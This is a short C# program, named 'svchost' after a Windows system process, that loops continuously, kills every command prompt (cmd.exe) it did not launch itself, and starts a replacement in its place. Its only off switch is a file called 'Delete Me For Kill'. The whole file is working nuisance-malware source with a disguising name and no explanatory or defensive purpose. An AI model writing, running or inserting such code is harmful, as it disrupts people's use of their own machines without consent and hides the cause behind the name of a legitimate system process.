using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
namespace svchost
{
    internal class Program
    {
        static List<int> FakeProcess = new List<int>();
        static void Main(string[] args)
        {
            File.WriteAllText("Delete Me For Kill", Process.GetCurrentProcess().Id.ToString());
            while (true)
            {
                if (!File.Exists("Delete Me For Kill"))
                    return;
                foreach (var Proc in Process.GetProcessesByName("cmd"))
                {
                    if (!FakeProcess.Contains(Proc.Id)) {
                        Proc.Kill();
                        Process FakeProc = new Process();
                        FakeProc.StartInfo.FileName = "cmd.exe";
                        FakeProc.Start();
                        FakeProcess.Add(FakeProc.Id);
                    }
                }
                Thread.Sleep(1);
            }
        }
    }
}
